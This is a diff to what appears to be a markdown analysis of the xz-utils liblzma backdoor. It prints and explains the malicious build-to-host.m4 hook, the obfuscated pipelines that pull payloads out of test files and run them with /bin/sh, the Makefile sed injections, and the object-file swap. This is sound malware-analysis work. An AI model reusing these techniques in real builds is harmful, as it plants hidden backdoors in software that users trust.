@@ -10,11 +10,11 @@
 |configure.ac|build-to-host.m4|Makefile|
 |CMakeLists.txt|bad-3-corrupt_lzma2.xz|libtool|
 |builds.sh|good-large_compressed.lzma|crc64_fast.c|
-|-|liblzma_la-crc64_fast.o|crc_x86_clmul.h|
+|crc_x86_clmul.h|liblzma_la-crc64_fast.o|-|
 
 
 ## Files
-<!--Add liblzma_la-crc64_fast.o & crc_x86_clmul-->
+
 ### `configure.ac` / `CMakeLists.txt`
 
 - Select a fast CRC function at startup time.(2023.06.22)
@@ -26,6 +26,12 @@
 
 - Disable ifunc support during oss-fuzz builds(2023.07.07)
     - [projects/xz/builds.sh](https://github.com/google/oss-fuzz/commit/d2e42b2e489eac6fe6268e381b7db151f4c892c5?diff=unified&w=0)
+
+
+### `crc_x86_clmul.h`(`crc_clmul.c`)
+
+- Using `is_arch_extension_supported` and `__get_cpuid` for exploit(2023.10.19)
+    - [src/liblzma/check/crc_x86_clmul.h](https://git.tukaani.org/?p=xz.git;a=commit;h=8c0f9376f58c0696d5d6719705164d35542dd891)
 
 
 ### `bad-3-corrupt_lzma2.xz` / `good-large_compressed.lzma`
@@ -80,7 +86,7 @@ fi
 ```sh
 AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])
 ```
-- Execute shell script
+- Execute the deofuscate script
 
 
 ### 2. `bad-3-corrupt_lzma2.xz`
@@ -95,8 +101,8 @@ AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null], [
 [ ! $(uname) = "Linux" ] && exit 0
 eval `grep ^srcdir= config.status`
 if test -f ../../config.status;then
-eval `grep ^srcdir= ../../config.status`
-srcdir="../../$srcdir"
+    eval `grep ^srcdir= ../../config.status`
+    srcdir="../../$srcdir"
 fi
 export i="((head -c +1024 >/dev/null) && head -c +2048 &&
     (head -c +1024 >/dev/null) && head -c +2048 &&
@@ -115,16 +121,18 @@ export i="((head -c +1024 >/dev/null) && head -c +2048 &&
     (head -c +1024 >/dev/null) && head -c +2048 &&
     (head -c +1024 >/dev/null) && head -c +2048 &&
     (head -c +1024 >/dev/null) && head -c +939)";
-(xz -dc $srcdir/tests/files/good-large_compressed.lzma|
-    eval $i|tail -c +31233|
-    tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377")|
-    xz -F raw --lzma1 -dc|/bin/sh
+(xz -dc $srcdir/tests/files/good-large_compressed.lzma\
+| eval $i\
+| tail -c +31233\
+| tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377")\
+| xz -F raw --lzma1 -dc\
+| /bin/sh
 ####World####
 ```
 - If OS is not based on Linux, terminate script
 - Set `srcdir`
 - `(xz -dc $srcdir/tests/files/good-large_compressed.lzma | eval $i|tail -c +31233 | tr \114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377") | xz -F raw --lzma1 -dc|/bin/sh`
-- This command Deofuscate `tests/files/good-large_compressed.lzma`
+- Deofuscate `tests/files/good-large_compressed.lzma`
 
 
 ### 3. `good-large_compressed.lzma`
@@ -151,6 +159,9 @@ eval $zrKcVq
 ```
 - Not declared variable
 
+---
+
+#### if #1 - Running during configure in the tarball root directory
 ```sh
 if test -f config.status; then
     eval $zrKcSS
@@ -185,10 +196,14 @@ if test -f config.status; then
         fi
     fi
 ```
+```sh
+cat $f1 | tail -c +$(echo $vs | cut -d: -f2) + 7 | haed -c +$(echo $ve | cut -d: -f2) - $start | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc
+```
 - Added in 5.6.1
 - Find file that include string `~!:_ W` and `|_!{ -`
+- (There is no file that include the magic strings)
 - Check for `$f1` and `$f2` is identical and if `$f1` is exists
-- Run command `cat $f1 | tail -c +$(echo $vs | cut -d: -f2) + 7 | haed -c +$(echo $ve | cut -d: -f2) - $start | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`
+
 
 ```sh
     eval $zrKccj
@@ -259,7 +274,7 @@ if test -f config.status; then
 - Check if backdoor files exists
 - `p="good-large_compressed.lzma"`
 - `U="bad-3-corrupt_lzma2.xz"`
-- (If there is no backdoor files, how this procedure could run..?)
+- (If there is no backdoor files, how to access this procedure..?)
 
 ```sh
     if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
@@ -418,23 +433,27 @@ am__test_dir = $(top_srcdir)/tests/files/$(am__test)
     fi
 ```
 - `sed -i "s/$u/$k/" src/liblzma/Makefile || true`
-- Changes `src/liblzma/Makefile`
+- Changes `$u` to `$k` in `src/liblzma/Makefile`
 - `u="AM_V_CCLD = \$(am__v_CCLD_\$(V))"`
 - `k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"`
-`- sed rpath \$(am__test_dir) | \$(am__dist_setup) >/dev/null 2>&1";`
+- `sed rpath \$(am__test_dir) | \$(am__dist_setup) >/dev/null 2>&1";`
 - `"am__test_dir=\$(top_srcdir)/tests/files/\$(am__test)"`
 - `"am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/null | \$(SHELL)"`
 - `sed rpath {file}` == `cat {file}`
 - `cat $(top_srcdir)/tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d 2>/dev/null | \$(SHELL)`
 - Same as `cat ./tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d | /bin/sh`
 - `m="^LTLIBRARIES = \$(lib_LTLIBRARIES)"`
-- Because of length, not gonna mention `l` in this line
-- There is no assigned variables. Maybe `sed -i "/$m/i$l" src/liblzma/Makefile || true` is not used yet or subterfuge(Not mentioned in reference post)
+- `l` is in upper code block
+- `sed -i "/$m/i$l" src/liblzma/Makefile || true`
+- Insert `$l` next line of `$m`
 
+---
+
+#### if #2 - run during make in the liblzma directory
 ```sh
 elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_fast.o); then
 ```
-- In this condition, assume `make` in the liblzma directory instead of running during `configure` in the tarball root directory
+- In this condition(`elif`), assume `make` in the liblzma directory instead of running during `configure` in the tarball root directory
 
 ```sh
     vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null`
@@ -455,24 +474,17 @@ elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_
         fi
     fi
 ```
-- Added in 5.6.1
-- Find file that include string `jV!.^%` and `%.R.1Z`
-- Check for `$f1` and `$f2` is identical and if `$f1` is exists
-
 ```sh
 cat (echo `grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null` | cut -d: -f1)\
 | tail -c +(echo 'grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null' | cut -d: -f2) + 7\
-| head -c +(echo 'grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2>/dev/null' | cut -d: -f2)\
-- (echo 'grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null' | cut -d: -f2) + 7\
+| head -c +(echo 'grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2>/dev/null' | cut -d: -f2) - (echo 'grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null' | cut -d: -f2) + 7\
 | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377"\
 | xz -F raw --lzma2 -dc
 ```
-- <!--상단 스크립트 설명-->
-
-```sh
-cat $f1 | tail -c +(expr $(echo (grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null)) | cut -d: -f2) + 7) | head -c +(expr $(echo (grep -broaF '%.R.1Z' $top_srcdir/tests/files 2>/dev/null) | cut -d: -f2) - (expr $(echo (grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null) | cut -d: -f2) + 7)) | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc
-```
-- 
+- Added in 5.6.1
+- Find file that include string `jV!.^%` and `%.R.1Z`
+- (There is no file that include the magic strings)
+- Check for `$f1` and `$f2` is identical and if `$f1` is exists
 
 ```sh
     eval $zrKcKQ
@@ -540,7 +552,7 @@ LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c
 ```
 - RC4-like decryption function
 - The code above was for 5.6.1
-- In 5.6.0, second loop count set to 4096 instead of 8192
+- In 5.6.0, second loop count set to `4096` instead of `8192`
 
 ```sh
 xz -dc --single-stream | ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true
@@ -664,7 +676,7 @@ xz -dc ./tests/files/good-large_compressed.lzma\
             eval $RgYB
             if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then
 ```
-- 
+- If relink to .la file is available
 
 ```sh
                 if test ! -f .libs/liblzma.so; then
@@ -672,12 +684,13 @@ xz -dc ./tests/files/good-large_compressed.lzma\
                     mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
                 fi
 ```
-- 
+- If the link succeed but didn't write the file, assume it failed and restore the backups.
 
 ```sh
                 rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true
 ```
-- 
+- Remove the libraries.
+- The `Makefile` link step is presumably going to happen next and recreate them.
 
 ```sh
             else
@@ -685,13 +698,13 @@ xz -dc ./tests/files/good-large_compressed.lzma\
                 mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
             fi
 ```
-- 
+- This is the `else` for the link failing. Restore from backups.
 
 ```sh
             rm -f .libs/liblzma_la-crc32-fast.o || true
             rm -f .libs/liblzma_la-crc64-fast.o || true
 ```
-- 
+- Inner compiler success case. Delete backups.
 
 ```sh
         else
@@ -699,22 +712,22 @@ xz -dc ./tests/files/good-large_compressed.lzma\
             mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
         fi
 ```
-- 
+- This is the `else` for the crc32 compilation failing. Restore from backups.
 
 ```sh
     else
         mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
     fi
 ```
-- 
+- This is the else for the crc64 compilation failing. Restore from backup.
 
 ```sh
     rm -f liblzma_la-crc64-fast.o || true
 ```
-- 
+- End of the `Makefile` section of the script. Delete the backup.
 
 ```sh
 fi
 eval $DHLd
 ```
-- 
+- Close the “elif we’re in a Makefile”, one more extension point/debug print, and we’re done! The script has injected the object file into the objects built during make, leaving no trace behind.
